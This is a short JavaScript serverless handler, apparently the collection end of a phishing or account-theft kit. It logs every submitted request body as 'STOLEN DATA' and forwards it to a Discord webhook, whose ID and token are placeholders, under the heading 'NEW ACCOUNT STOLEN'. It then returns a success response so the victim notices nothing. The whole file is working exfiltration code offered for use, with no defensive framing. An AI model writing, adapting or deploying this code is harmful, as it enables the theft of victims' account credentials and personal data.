module.exports = async (req, res) => {
  const data = req.body;
  console.log('STOLEN DATA:', data);
  
  // Send to your Discord webhook
  await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: `**NEW ACCOUNT STOLEN**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
    })
  });

  res.json({ success: true });
};
